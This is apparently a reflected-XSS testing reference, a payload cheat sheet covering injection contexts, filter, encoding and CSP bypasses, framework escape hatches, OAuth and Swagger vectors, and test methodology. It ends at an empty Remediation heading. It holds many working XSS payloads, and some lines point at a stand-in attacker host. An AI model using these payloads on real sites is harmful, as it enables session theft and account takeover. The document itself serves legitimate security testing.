---
name: rxss
description: Comprehensive reflected XSS testing reference covering every injection context, bypass technique, framework escape hatch, CSP bypass, and real-world HackerOne/CVE finding patterns with verbatim payloads for each context.
sources: hackerone_public, portswigger, owasp, bug_bounty_reports, cve_database
---

# Reflected XSS Testing

## Definition and Classification

Reflected XSS occurs when ALL five conditions are true:

1. **Request-controlled input** — attacker places arbitrary content in a query parameter, path segment, form field, header, cookie, or JSON body
2. **Immediate response reflection** — the server echoes the value back in the same HTTP response (not stored for later)
3. **Insufficient context-specific encoding** — the value is not correctly escaped for its output context
4. **Browser executes it** — the HTML parser, JavaScript engine, or URL handler interprets the value as executable code
5. **Deliverable** — a victim can be induced to trigger the crafted request (via link, form, etc.)

**What is NOT reflected XSS:**
- Stored XSS (persisted server-side, served to other users later)
- Pure DOM XSS (no server round-trip; client-side source-to-sink only)
- Self-XSS (only the attacker can trigger it; no victim delivery path)
- HTML injection without execution (reflected but no script execution context reached)

---

## Request-to-Browser Pipeline

The pipeline from attacker input to browser execution has up to 16 transformation stages. Order matters — validation at the wrong stage can be bypassed.

```
Attacker input (query param, POST body, header, cookie)
  |
  +-- Stage 1:  URL decoding (web server / reverse proxy)
  +-- Stage 2:  Form body decoding (application/x-www-form-urlencoded)
  +-- Stage 3:  JSON/XML parsing
  +-- Stage 4:  Character-set conversion
  +-- Stage 5:  Unicode normalization (NFC/NFD/NFKC/NFKD)
  +-- Stage 6:  Framework parameter binding
  +-- Stage 7:  Proxy rewriting
  +-- Stage 8:  Application validation (allowlist/blocklist/regex)
  +-- Stage 9:  Business logic
  +-- Stage 10: Template engine rendering
  +-- Stage 11: Output encoding / sanitization
  +-- Stage 12: Response serialization
  |
  HTTP Response
  |
  +-- Stage 13: Browser HTML parsing (tokenization, tree construction)
  +-- Stage 14: Script execution
  +-- Stage 15: DOM mutation after parsing (innerHTML reparsing)
  +-- Stage 16: Client-side JS processing (hybrid reflected/DOM)
```

**Critical:** Encoding correct for stage 11 may be insufficient if stage 15 reverses it. A server emitting `&lt;script&gt;` is safe in HTML text, but client-side JS reading via `textContent` then assigning to `innerHTML` reverses the escaping.

**Validation ordering gap:** If the validator inspects URL-encoded form but the template engine receives the decoded form, validation was ineffective. Unicode normalization (NFKC) can map characters like U+FE64 (SMALL LESS-THAN SIGN) to `<` after validation.

**HTTP Parameter Pollution:** WAFs may inspect the first occurrence while the app uses the last (PHP/Ruby), or vice versa.

| Technology | Behavior with `?a=SAFE&a=PAYLOAD` |
|---|---|
| PHP | Takes LAST value (PAYLOAD) |
| ASP.NET | Joins all values (SAFE,PAYLOAD) |
| Python (Flask) | Takes FIRST value (SAFE) |
| Java (Servlet) | Takes FIRST value (SAFE) |
| Node.js (Express) | Returns array |
| Ruby (Rack) | Takes LAST value (PAYLOAD) |

---

## Input Surface Checklist

### URL-Based
| Source | Example | Test Pattern |
|---|---|---|
| Query parameter | `?q=VALUE` | Every GET endpoint that reflects the value |
| Path segment | `/category/VALUE/list` | Breadcrumbs, page titles, 404 messages |
| Matrix parameter | `/resource;sort=VALUE` | Framework-dependent |

### Request Body
| Source | Reflected Where |
|---|---|
| Form field (POST) | Error messages, validation feedback |
| JSON property | GraphQL variables, API error responses |
| XML value | SOAP, legacy XML APIs |
| Multipart filename | File upload error display |
| GraphQL variables | Schema error reflection |

### Headers
| Header | Reflected Where | Delivery |
|---|---|---|
| `Host` / `X-Forwarded-Host` | Page titles, canonical URLs, error pages | CRLF injection or controlled proxy |
| `Referer` | "Back" links, analytics | Link from attacker page |
| `User-Agent` | Debug pages, admin dashboards | Victim uses attacker-controlled UA |
| `Accept-Language` | Language selector errors | Limited character set |

### Application-Specific
| Source | Parameter Names |
|---|---|
| OAuth redirect | `redirect_uri`, `redirect_url`, `return_url`, `returnTo`, `next`, `continue`, `callback`, `redirect`, `destination`, `target` |
| OAuth error | `error`, `error_description` |
| OAuth state | `state` |
| API doc config | `url`, `configUrl` |
| Pagination / sort | `?sort=VALUE&order=asc` |
| Cookies | `lang=VALUE`, `utm_source=VALUE` |

---

## Browser Parsing Contexts

The HTML5 tokenizer state at the reflection point determines which characters are dangerous.

| Tokenizer State | Triggered By | `<` Starts Tags? | Character References? | Escape Method |
|---|---|---|---|---|
| **Data state** | Normal HTML | YES | YES | HTML entity encoding |
| **RCDATA** | `<title>`, `<textarea>` | NO | YES | Must inject `</title>` or `</textarea>` |
| **RAWTEXT** | `<style>`, `<xmp>`, `<iframe>`, `<noembed>`, `<noframes>` | NO | NO | Must inject matching end tag |
| **Script data** | `<script>` | Special (`</script>` only) | NO | `</script>` terminates regardless of JS context |
| **Attribute (double-quoted)** | `attr="..."` | -- | YES | Break with `"` |
| **Attribute (single-quoted)** | `attr='...'` | -- | YES | Break with `'` |
| **Attribute (unquoted)** | `attr=...` | -- | YES | Whitespace, `>`, `"`, `'`, backtick all break it |

### Triple-Layer Decoding

Browsers apply up to three independent decoding layers, creating bypass opportunities when filters only inspect the encoded form.

**Layer 1 — HTML entity decoding** (HTML text and attribute values):
- `&lt;` -> `<`, `&gt;` -> `>`, `&amp;` -> `&`, `&quot;` -> `"`, `&#x27;` -> `'`
- Decimal: `&#60;` -> `<`
- Hex: `&#x3C;` -> `<`
- NOT applied inside `<script>` or `<style>` RAWTEXT content

**Layer 2 — URL decoding** (href, src, action, URL-bearing attributes):
- `%3C` -> `<`, `%22` -> `"`
- Applied AFTER HTML entity decoding in attributes
- Double encoding: `%253C` -> `%3C` -> `<` (if server also URL-decodes)

**Layer 3 — JavaScript decoding** (inside JS execution contexts):
- Unicode escapes: `\u003C` -> `<`, `\u{3C}` -> `<`
- Hex escapes: `\x3C` -> `<`
- Octal: `\074` -> `<` (non-strict mode only)
- Applied AFTER HTML entity decoding in event-handler attributes

**Critical implication for event handlers:** In `onclick="handleClick('VALUE')"`, the browser HTML-entity-decodes the attribute first, then passes the result to JavaScript. So `&#x27;` becomes `'` before JS evaluation, allowing string breakout via HTML entities.

**Browser engine differences relevant to XSS:**

| Feature | Blink (Chrome/Edge) | Gecko (Firefox) | WebKit (Safari) |
|---|---|---|---|
| XSS Auditor | Removed (Chrome 78, 2019) | Never implemented | Removed (Safari 13, 2019) |
| Trusted Types | Supported (Chrome 83+) | Not supported | Not supported |
| `popover` attribute | Chrome 114+ | Firefox 125+ | Safari 17+ |
| `<selectedcontent>` mutation | Chrome 130+ (DOMPurify CVE-2026-47423) | N/A | N/A |
| `accesskey` on hidden inputs | Fires onclick | Fires onclick | Not confirmed |

---

## Context-Specific Payloads and Techniques

### HTML Body (Between Tags)

**Context:** `<div>VALUE</div>`, `<p>Your search: VALUE returned 0 results</p>`

**Attack:** Inject a tag that fires without user interaction.

**Auto-fire (no click needed):**
```html
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<iframe onload=alert(1)>
<input autofocus onfocus=alert(1)>
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>
<video autoplay onplay=alert(1)><source src=x></video>
<audio autoplay onplay=alert(1)><source src=x></audio>
```

**Case bypass (blocklist filters `<script>`):**
```html
<SCRIPT>alert(1)</SCRIPT>
<ScRiPt>alert(1)</ScRiPt>
<svg><SCRIPT>alert(1)</SCRIPT></svg>
```

**Nested bypass** (filter removes `<script>` once — becomes `<script>` after removal):
```
<scr<script>ipt>alert(1)</scr</script>ipt>
```

**Event handlers that fire without user interaction:**

| Event | Tag | Notes |
|---|---|---|
| `onload` | `<img>`, `<iframe>`, `<body>`, `<svg>` | Fires on resource load/error |
| `onerror` | `<img src=x>`, `<video>`, `<audio>` | Fires on load failure |
| `onfocus` + `autofocus` | `<input>`, `<select>`, `<textarea>` | Auto-fires on page load |
| `ontoggle` | `<details open>` | Fires when open attribute present |
| `onstart` | `<marquee>` | Fires when marquee starts |
| `onanimationend` | Any element with CSS animation | Fires when animation completes |
| `onpageshow` | `<body>` | Fires on page load |
| `onhashchange` | `<body>` | Fires when URL hash changes |

### HTML Attributes — Double-Quoted

**Context:** `<input value="VALUE" />`

```
VALUE" autofocus onfocus=alert(1) x="
VALUE" onmouseover=alert(1) x="
VALUE"><img src=x onerror=alert(1)>
VALUE"><svg onload=alert(1)>
VALUE" accesskey=x onclick=alert(1) x="
```

### HTML Attributes — Single-Quoted

```
VALUE' autofocus onfocus=alert(1) x='
VALUE'><img src=x onerror=alert(1)>
VALUE'><svg onload=alert(1)>
```

### HTML Attributes — Unquoted

**Context:** `<div class=VALUE>` — whitespace, `>`, `"`, `'`, backtick all terminate the value.

```
VALUE onmouseover=alert(1)
VALUE><img src=x onerror=alert(1)>
VALUE><svg onload=alert(1)>
VALUE autofocus onfocus=alert(1)
```

### Event-Handler Attributes

**Context:** `<div onclick="doSomething('VALUE')">` or `<a href="#" onclick="track('VALUE')">`

**Break JS string AND HTML attribute:**
```
VALUE');alert(1)//
VALUE'-alert(1)-'
VALUE\');alert(1)//
```

**Backslash-escaping bypass** (app escapes `'` to `\'` but NOT `\`):
```
Input:   \');alert(1)//
Output:  \\');alert(1)//
Result:  \\ = literal backslash, ' terminates string
```

**HTML entity bypass** (browser HTML-decodes attribute before passing to JS):
```
&#x27;);alert(1)//
&#39;);alert(1)//
&apos;);alert(1)//
```

### URL-Bearing Attributes (href, src, action, formaction)

**Context:** `<a href="VALUE">`, `<form action="VALUE">`

**javascript: protocol injection:**
```
javascript:alert(1)
javascript:alert(document.domain)
JAVASCRIPT:alert(1)
Javascript:alert(1)
java script:alert(1)
java&#x09;script:alert(1)
java&#x0A;script:alert(1)
java%09script:alert(1)
&#x6A;avascript:alert(1)
```

Chrome, Firefox, and Safari all execute `javascript:` in href on click. React 19+ blocks this in JSX but earlier versions do not.

### JavaScript String Contexts

**Context:** `<script>var q = 'VALUE';</script>` or `<script>var msg = "VALUE";</script>`

**Single-quote breakout:**
```
VALUE';alert(1)//
VALUE'-alert(1)-'
VALUE';alert(1);var x='
```

**Double-quote breakout:**
```
VALUE";alert(1)//
VALUE"-alert(1)-"
```

**Template literal breakout** (`` <script>var x = `VALUE`;</script> ``):
```
${alert(1)}
${alert(document.domain)}
`-alert(1)-`
```
No quote termination needed — `${...}` executes inside the template literal.

**Script block termination** (HTML parser runs BEFORE JS engine — `</script>` always ends the block):
```
VALUE</script><svg onload=alert(1)>
VALUE</script><img src=x onerror=alert(1)>
</SCRIPT><script>alert(1)</script>
```

**Backslash-escaping bypass** (app escapes `'` to `\'` but not `\`):
```
Input:  \';alert(1)//
Output: \\';alert(1)//
        ^  ^
        literal backslash + string terminator
```

### Inline JSON in Script Tag

**Context:** `<script>var config = {"query":"VALUE","page":1};</script>`

```
VALUE","x":"</script><img src=x onerror=alert(1)>
VALUE"};alert(1)//
VALUE","exec":alert(1),"y":"
</script><script>alert(1)</script>
```

**`</script>` prevention bypass:**
```
VALUE</scri\u0070t>
VALUE</script >
```

The correct server-side defense is encoding `<` as `\u003C` inside JSON within `<script>` blocks.

### RCDATA Contexts (title, textarea)

**Context:** `<title>VALUE</title>` or `<textarea>VALUE</textarea>`

Inside RCDATA, `<` does NOT start tags. Only the matching end tag escapes:
```
VALUE</title><script>alert(1)</script>
VALUE</textarea><script>alert(1)</script>
VALUE</title><img src=x onerror=alert(1)>
```

### HTML Comments

**Context:** `<!-- Your search: VALUE -->`

```
VALUE--><script>alert(1)</script>
VALUE--!><img src=x onerror=alert(1)>
```

### SVG/MathML Namespace

```html
<svg><script>alert(1)</script></svg>
<svg onload=alert(1)>
<math><mi//xlink:href="data:x,<script>alert(1)</script>">
```

HTML integration points within SVG (switch back to HTML parsing):
- `<foreignObject>`, `<desc>`, `<title>` within SVG
- `<mi>`, `<mo>`, `<mn>`, `<ms>`, `<mtext>` within MathML

**Namespace confusion DOMPurify bypass pattern:** In SVG namespace, `<style>` is NOT RAWTEXT — a sanitizer that treats it as RAWTEXT misses injections within it.

### iframe srcdoc

**Context:** `<iframe srcdoc="VALUE"></iframe>`

The srcdoc value is HTML-entity-decoded (it's an attribute), then parsed as a full HTML document inheriting the parent's origin.

```
VALUE<script>alert(parent.document.cookie)</script>
VALUE"><script>alert(1)</script>
```

### Hidden Input + accesskey

If attacker controls attributes on a hidden input:
```html
<input type="hidden" accesskey="X" onclick="alert(1)" />
```
Trigger: ALT+SHIFT+X (Firefox), ALT+X (Chrome on some platforms)

This makes previously unexploitable reflections exploitable with minor user interaction.

---

## Encoding Bypass Payloads

### HTML Entity Bypass

For filters blocking `<`, `>`, `"` literally but not encoded forms:
```
&lt;script&gt;alert(1)&lt;/script&gt;
&#60;script&#62;alert(1)&#60;/script&#62;
&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;
```
Only works if the browser HTML-decodes in that context (not inside `<script>` RAWTEXT).

### URL Encoding

```
%3Cscript%3Ealert(1)%3C/script%3E
%22%3E%3Csvg%20onload%3Dalert(1)%3E
```

**Double URL encoding:**
```
%253Cscript%253E  -> (server decodes) -> %3Cscript%3E -> (browser) -> <script>
```

### Unicode Bypass (in JS contexts)

```
\u003Cscript\u003Ealert(1)\u003C/script\u003E
\x3Cscript\x3E
```

**Unicode normalization bypass** (NFKC maps lookalike chars):
- U+FE64 (SMALL LESS-THAN SIGN) normalizes to `<` after NFKC
- U+FE65 (SMALL GREATER-THAN SIGN) normalizes to `>`
- Applies when server validates before normalizing

### Whitespace and Special Chars Between Attribute Name and Value

```
<img src=x onerror=alert(1)>           (space)
<img src=x onerror\x09=alert(1)>       (tab, 0x09)
<img src=x onerror\x0A=alert(1)>       (newline)
<img src=x onerror\x0D=alert(1)>       (carriage return)
```

### Null Byte

```
<scr\x00ipt>alert(1)</scr\x00ipt>
```

---

## Polyglot Payloads

Payloads designed to work across multiple contexts:

```
'"--></style></script><svg/onload=alert(1)>
```

```
'`"><svg onload=alert(1)><!--
```

```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```

```
\x3cscript\x3ealert(1)\x3c/script\x3e
```

```
<svg><script>alert&lpar;1&rpar;</script>
```

**Attribute polyglot:**
```
"onmouseover="alert(1)" x="
'onmouseover='alert(1)' x='
```

**JS string polyglot:**
```
';alert(1)//
";alert(1)//
`;alert(1)//
${alert(1)}
\');alert(1)//
```

---

## CSP Bypass Techniques

A CSP with `script-src` restrictions blocks inline script execution but does NOT fix the underlying injection flaw. The injection still exists; CSP provides defense in depth.

### JSONP Endpoints on Same Origin

If `script-src 'self'` and the same origin has a JSONP endpoint:
```
/api/data?callback=alert(1)
/jsonp?cb=alert(document.cookie)
```
Result: `alert(1)({"data":"..."})` — valid JS loaded via `<script src>`.

**Common JSONP paths:**
```
/api/jsonp?callback=
/api/data.jsonp?callback=
/services/json?callback=
/api?format=jsonp&callback=
/?format=json-p&jsoncallback=
```

### Angular CDN Bypass

If CSP allows `ajax.googleapis.com`:
```html
<script src="//ajax.googleapis.com/ajax/libs/angularjs/1.0.1/angular.js"></script>
<div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>
```

### strict-dynamic Bypass

`'strict-dynamic'` trusts scripts loaded by already-trusted scripts. If a trusted script dynamically creates script elements from user input (DOM XSS sink), CSP is bypassed.

### Missing base-uri

Without `base-uri 'self'`, an injected `<base>` tag redirects all relative script loads:
```html
<base href="https://attacker.com/">
```

### unsafe-inline = No Protection

If `Content-Security-Policy: script-src 'unsafe-inline'` — standard XSS payloads will execute.

### report-only = No Blocking

`Content-Security-Policy-Report-Only:` does NOT block execution. Underlying injection is fully exploitable.

---

## Framework-Specific Escape Hatches

### React / Next.js

**Default protection:** JSX auto-escapes all string interpolations via `textContent`.

**Dangerous escape hatches:**
```jsx
// Bypasses all React escaping
<div dangerouslySetInnerHTML={{__html: userInput}} />

// javascript: URL (dangerous in React < 19)
<a href={userInput}>Link</a>

// Direct DOM manipulation
inputRef.current.innerHTML = userInput;
```

**Next.js SSR hydration:**
```html
<!-- type="application/json" means NOT directly executed -->
<!-- BUT client-side code using this via innerHTML creates hybrid XSS -->
<script id="__NEXT_DATA__" type="application/json">
  {"props":{"pageProps":{"query":"VALUE"}}}
</script>
```

**Detection:** `__NEXT_DATA__` in page source, `data-reactroot` attribute

### Vue / Nuxt

**Default protection:** `{{ value }}` double-curly-brace auto-encodes HTML.

**Dangerous escape hatches:**
```html
<div v-html="userInput"></div>
<a :href="userInput">Link</a>
<div v-bind="userControlledObject">
```

**Nuxt 2 hydration (executable JavaScript, higher risk):**
```html
<script>window.__NUXT__={data:[{query:"VALUE"}]}</script>
```
VALUE must be properly JS-encoded or breakout is possible.

**CVEs:** CVE-2026-46342 (Nuxt Nitro Server XSS), SNYK-JS-NUXT-7640972

**Detection:** `__NUXT__` or `__NUXT_DATA__` in page source

### Angular

**Default protection:** Template interpolation `{{ value }}` and `DomSanitizer` strip unsafe HTML.

**Dangerous escape hatches:**
```typescript
this.sanitizer.bypassSecurityTrustHtml(userInput)
this.sanitizer.bypassSecurityTrustScript(userInput)
this.sanitizer.bypassSecurityTrustUrl(userInput)
this.sanitizer.bypassSecurityTrustResourceUrl(userInput)
this.sanitizer.bypassSecurityTrustStyle(userInput)
this.elementRef.nativeElement.innerHTML = userInput;
```

**Detection:** `ng-version` attribute on root element

### Svelte / SvelteKit

**Default protection:** `{value}` auto-encodes HTML.

**Dangerous escape hatches:**
```html
{@html userInput}
<Fragment set:html={userInput} />
```

**Detection:** `data-svelte-h` attributes

### Astro

**Default protection:** `.astro` template expressions are auto-escaped.

**Dangerous escape hatches:**
```astro
<div set:html={userInput} />
<Fragment set:html={userInput} />
```

**CVE-2025-64764** (CVSS 7.1, Astro <= 5.15.6, fixed 5.15.8):
Server islands at `/_server-islands/[name]` accept `e` (export), `p` (props), `s` (slot content).
When `e=file`, the server returns the island file path using `markHTMLString` (skips escaping).
The `s` (slot) value is injected as child content without escaping.

```
/_server-islands/MyIsland?e=file&s=<script>alert(1)</script>
```

**Detection:** `data-astro-*` attributes

### HTMX

**Default protection:** NONE. All security is the server's responsibility.

**Dangerous features:**
```html
<button hx-on:click="alert(1)">
<div hx-on::load="eval(userInput)">
```

All HTMX swap operations use innerHTML-equivalent. Incompatible with strict CSP (needs `unsafe-eval` for `hx-on`, `hx-vals`, `hx-headers` with `javascript:` prefix).

**Detection:** `hx-*` attributes on elements

### Alpine.js

**Default protection:** NONE. Expressions in `x-data`, `x-bind`, `x-on`, `x-html` are evaluated as JavaScript.

**Dangerous features:**
```html
<div x-html="userInput"></div>
<div x-bind="userControlledObject">
<button x-on:click="eval(userInput)">
```

**Detection:** `x-data`, `x-bind` attributes

### Server-Side Template Engines

| Framework | Safe Pattern | DANGEROUS Pattern |
|---|---|---|
| Django Jinja2 | `{{ q }}` (auto-escaped) | `{{ q|safe }}` or `{% autoescape off %}` |
| Flask + Jinja2 | `{{ q }}` (auto-escaped) | `{{ q|safe }}` or `Markup(q)` |
| Node.js + EJS | `<%= q %>` (HTML-escaped) | `<%- q %>` (RAW) |
| PHP + Laravel/Blade | `{{ $q }}` (htmlspecialchars) | `{!! $q !!}` (RAW) |
| Ruby on Rails + ERB | `<%= q %>` (HTML-escaped) | `raw(q)` or `q.html_safe` |
| Java + Spring/Thymeleaf | `th:text="${q}"` | `th:utext="${q}"` (RAW) |
| Go html/template | `{{.Q}}` (context-aware) | `template.HTML(q)` (declared safe) |

---

## OAuth / OIDC Error Parameter Vectors

OAuth flows create multiple reflected XSS surfaces, especially in error display pages.

### Vulnerable Parameters

```
redirect_uri
redirect_url
return_url
returnTo
next
continue
callback
redirect
destination
target
error
error_description
state
login_hint
```

### Testing Patterns

```
GET /oauth/authorize?response_type=code&client_id=app&redirect_uri="><script>alert(1)</script>&state=test

GET /auth/callback?error=access_denied&error_description=<script>alert(1)</script>

GET /login?next=javascript:alert(1)

GET /sso/callback?redirect_uri=javascript:alert(1)

GET /oauth/authorize?client_id=app&state="><img src=x onerror=alert(1)>
```

### Real HackerOne Findings

| Program | Vulnerable Parameter | Context | Bounty |
|---|---|---|---|
| LINE Corporation | OAuth redirect parameter | Reflected in callback page | $1,989 |
| Shopify | OAuth redirect parameter | Reflected in error page | $1,750 |
| Reddit | Redirect parameter | Reflected in redirect confirmation page | $5,000 |
| TikTok | OAuth/redirect parameter | Reflected in callback handling | $5,000 |
| Twitter | CRLF -> reflected XSS | Via CRLF injection in redirect URL | $1,680 |
| TikTok (x2) | CRLF -> reflected XSS | Multiple CRLF-to-XSS reports | Various |

### Recent CVEs

| CVE | Product | Mechanism |
|---|---|---|
| CVE-2025-62800 | FastMCP | OAuth callback page did not sanitize reflected parameters |
| CVE-2026-77272 | MCP Atlassian | OAuth setup callback handler reflected parameters unsanitized |
| CVE-2026-40302 | OpenZiti zrok | GitHub OAuth callback unsanitized `refreshInterval` error rendering |

---

## Swagger UI / API Documentation XSS

### Swagger UI DOM XSS (GHSA-qrmm-w75w-3wpx)

**Affected:** Swagger UI < 4.1.3

**Attack:** The `url` and `configUrl` query parameters specify which OpenAPI spec to load. An attacker-controlled spec URL causes Swagger UI to fetch and render attacker-controlled content via `innerHTML`.

```
/swagger-ui/index.html?url=https://attacker.com/evil-spec.json
/swagger-ui/index.html?configUrl=https://attacker.com/config.json
/api-docs?url=data:application/json,{"swagger":"2.0","info":{"title":"<img src=x onerror=alert(1)>","version":"1"}}
```

**Predictable paths to check:**
```
/swagger-ui/
/swagger-ui/index.html
/swagger-ui.html
/api-docs
/api-docs/
/swagger
/swagger.json
/swagger.yaml
/redoc
/graphql
/graphiql
/graphql/playground
/docs
/api/docs
/v1/docs
/v2/docs
```

**HackerOne targets:** Adobe, IBM, U.S. Department of Defense have all received Swagger UI XSS reports.

### Other API Documentation Renderers

| Renderer | XSS Surface |
|---|---|
| ReDoc | Config injection via query parameters |
| GraphQL Playground | Query reflection in UI |
| GraphiQL | Same as GraphQL Playground |
| Postman Published Docs | User-generated content in renderer |

---

## DOM-Based Reflected XSS Source-Sink Pairs

Hybrid patterns where the server reflects the value into the page and client-side JS then processes it into a dangerous sink.

**Pattern 1: URL parameter -> innerHTML**
```javascript
const q = document.getElementById('search-data').dataset.query;
document.getElementById('results-title').innerHTML = 'Results for: ' + q;  // SINK
```

**Pattern 2: Reflected JSON -> innerHTML via client parsing**
```javascript
// Server: <script>var config = {query: "VALUE"};</script>
document.getElementById('title').innerHTML = config.query;  // SINK
```

**Pattern 3: location.search -> innerHTML**
```javascript
const params = new URLSearchParams(location.search);
document.getElementById('msg').innerHTML = 'You searched for: ' + params.get('q');  // SINK
```

**Pattern 4: textContent reversal**
```javascript
element.textContent = serverRenderedValue;  // safe
// Then later:
anotherElement.innerHTML = element.textContent;  // SINK: encoding reversed
```

**Key DOM sinks:**
```javascript
element.innerHTML = value;
element.outerHTML = value;
document.write(value);
document.writeln(value);
element.insertAdjacentHTML('beforeend', value);
eval(value);
setTimeout(value, 0);        // string form
setInterval(value, 0);       // string form
new Function(value)();
$.html(value);               // jQuery
$(value);                    // jQuery selector with HTML
element.attr('href', value); // jQuery with javascript:
```

**Next.js hybrid pattern:**
```javascript
// __NEXT_DATA__ not directly executed, but:
const data = JSON.parse(document.getElementById('__NEXT_DATA__').textContent);
document.getElementById('search-heading').innerHTML = data.props.pageProps.query;  // SINK
```

---

## CRLF Injection to Reflected XSS Chain

CRLF injection (`%0D%0A`) in parameters reflected into HTTP response headers allows full response body control.

**Payload:**
```
/redirect?url=https://example.com%0D%0AContent-Type:%20text/html%0D%0A%0D%0A<script>alert(1)</script>
```

**Resulting response:**
```
HTTP/1.1 302 Found
Location: https://example.com
Content-Type: text/html

<script>alert(1)</script>
```

**Modern mitigations:** Node.js v14+ throws on CRLF in `setHeader()`. Apache and Nginx reject CRLF in header values. Framework-generated headers are generally safe; custom header construction is not.

---

## Testing Methodology

### Phase 1: Reconnaissance

1. Identify all input surfaces (see Input Surface Checklist)
2. Send unique alphanumeric marker (e.g., `PROBE_a7b3c9d2`) to each input
3. Capture raw HTTP response (status, headers, body)
4. Record `Content-Type`, `Content-Security-Policy`, `X-Content-Type-Options` headers
5. Search response body for all reflection points
6. For each reflection, identify exact tokenizer state

### Phase 2: Context Analysis Per Reflection Point

- What is the HTML5 tokenizer state? (Data / RCDATA / RAWTEXT / Script / Attribute)
- Is the value inside quotes? (double / single / unquoted)
- Is it inside a JavaScript string, template literal, or JSON value?
- Is it in a URL-bearing attribute?
- What namespace is active? (HTML / SVG / MathML)
- Is there a CSP? What is `script-src`?

### Phase 3: Character Survival Matrix

Test which characters survive server-side processing:
```
< > " ' ` ( ) ; : = & # \ / ? ! @ $ % ^ *
```
Send each one, check raw vs. encoded in the response.

### Phase 4: Context-Specific Test

Apply payload matching the identified context. Use harmless marker: `console.log('XSS_PROOF_'+document.domain)`

### Phase 5: Negative Control

Apply correct encoding for identified context, resubmit, verify value appears as inert text.

### Common URL Patterns to Test

```
# Search / query parameters
/search?q=PROBE
/find?query=PROBE
/results?term=PROBE
/?s=PROBE
/api/search?q=PROBE

# Error-inducing parameters
/page?id=PROBE_invalid
/api/resource/PROBE_notfound
/login (POST: username=PROBE)

# OAuth / auth
/oauth/authorize?redirect_uri=PROBE
/auth/callback?error=PROBE&error_description=PROBE
/login?next=PROBE
/sso/callback?redirect=PROBE

# API documentation
/swagger-ui/index.html?url=PROBE
/api-docs?configUrl=PROBE

# Path segments reflected in breadcrumbs / titles
/category/PROBE/list
/product/PROBE/details
/tag/PROBE

# Headers (via proxy)
Referer: https://PROBE/
User-Agent: PROBE
Host: PROBE
X-Forwarded-Host: PROBE
```

### Fuzz String Set

Short fuzz strings to identify reflection and encoding behavior:
```
<
>
"
'
`
<>
<script>
<img src=x>
'"
"><
'">
</script>
${7*7}
{{7*7}}
%3C
%22
&lt;
&#x3C;
\u003c
<svg>
javascript:
```

---

## Payload Wordlist

### Tier 1 — Detection (inert, identifies reflection)
```
PROBE_xss_1
<probe_xss_2>
"probe_xss_3
'probe_xss_4
probe_xss_5</probe>
probe_xss_6${7*7}
```

### Tier 2 — Context Confirmation (break out without executing)
```
"><x
'><x
"><svg
'><svg
</script><x
</title><x
-->x
VALUE" x="
VALUE' x='
```

### Tier 3 — Harmless Execution Proof (isolated lab only)
```
<script>console.log('xss:'+document.domain)</script>
<img src=x onerror=console.log('xss:'+document.domain)>
<svg onload=console.log('xss:'+document.domain)>
<details open ontoggle=console.log('xss:'+document.domain)>
"><script>console.log('xss:'+document.domain)</script>
"><img src=x onerror=console.log('xss:'+document.domain)>
"><svg onload=console.log('xss:'+document.domain)>
'><script>console.log('xss:'+document.domain)</script>
'><img src=x onerror=console.log('xss:'+document.domain)>
";console.log('xss:'+document.domain)//
';console.log('xss:'+document.domain)//
`+console.log('xss:'+document.domain)+`
${console.log('xss:'+document.domain)}
javascript:console.log('xss:'+document.domain)
</script><img src=x onerror=console.log('xss:'+document.domain)>
</title><script>console.log('xss:'+document.domain)</script>
</textarea><script>console.log('xss:'+document.domain)</script>
--><script>console.log('xss:'+document.domain)</script>
```

### Tier 4 — Encoding Bypass Variants
```
%3Cscript%3Econsole.log(1)%3C/script%3E
%22%3E%3Cscript%3Econsole.log(1)%3C/script%3E
&#x3C;script&#x3E;console.log(1)&#x3C;/script&#x3E;
\u003cscript\u003econsole.log(1)\u003c/script\u003e
<SCript>console.log(1)</SCript>
<img src=x onerror\x09=console.log(1)>
<img src=x onerror\x0A=console.log(1)>
java&#x09;script:console.log(1)
```

---

## False Positive Elimination

| Check | Test | Positive = NOT XSS |
|---|---|---|
| HTML-entity encoding | Submit `<img>`, check response for `&lt;img&gt;` | Value is fully encoded |
| Text-only rendering | Inspect DOM in DevTools | Value is in a Text node, not an Element |
| JSON Content-Type | Check `Content-Type` header | `application/json` + `nosniff` present |
| `Content-Disposition: attachment` | Check response headers | Browser downloads, doesn't render |
| CSP blocking | Check CSP header, test without CSP | Blocked AND no bypass path |
| Self-XSS | Can the crafted URL be sent to another user? | Only the attacker can trigger it |
| Scanner false positive | Open URL in real browser | No actual DOM change or execution |
| Inert context | In `<template>`, HTML comment, or PLAINTEXT? | No escape path exists |

---

## Root Cause Classification

| Code | Root Cause | Fix |
|---|---|---|
| RC-1a | No encoding applied | Apply context-specific encoder |
| RC-1b | Wrong context encoding (HTML encode in JS string) | Use JS string encoder |
| RC-1c | Partial encoding (`<` and `>` encoded, `"` and `'` not) | Encode all dangerous characters |
| RC-1d | Inconsistent encoding (error template unencoded) | Apply encoding to ALL templates |
| RC-2a | Validation before decoding (double-encoding bypass) | Validate after all decoding |
| RC-2b | Encoding reversed by client (innerHTML) | Use `textContent` on client |
| RC-2c | Unicode normalization after validation | Normalize before validating |
| RC-3a | Intentional raw output (dangerouslySetInnerHTML, v-html) | Sanitize with DOMPurify before raw output |
| RC-4a | Sanitizer not called on all paths | Add sanitizer call on all paths |
| RC-4b | Sanitizer bypassed (mXSS, namespace confusion) | Update DOMPurify to latest |
| RC-5a | WAF/app parser differential (WAFFLED) | Normalize at WAF layer |
| RC-6a | CRLF injection | Strip CRLF from all header values |
| RC-7a | Framework serialization bug | Update framework |
| RC-8a | Debug mode in production | Disable debug mode |

---

## Severity Assessment

**CVSS 3.1 baseline:** 6.1 (Medium) — `AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N`

| Factor | Increases Severity | Decreases Severity |
|---|---|---|
| Authentication context | Authenticated page | Public-only page |
| CSP | No CSP or `unsafe-inline` | Strict nonce-based CSP |
| Cookie flags | Session cookie lacks `HttpOnly` | `HttpOnly` set |
| SameSite | `SameSite=None` | `SameSite=Lax` or `Strict` |
| User interaction | `onload`, `onerror` auto-fire | Requires specific keypress |
| Chaining | + cache poisoning = effectively stored XSS | Standalone reflected only |

---

## Remediation

### Context-Specific Output Encoding

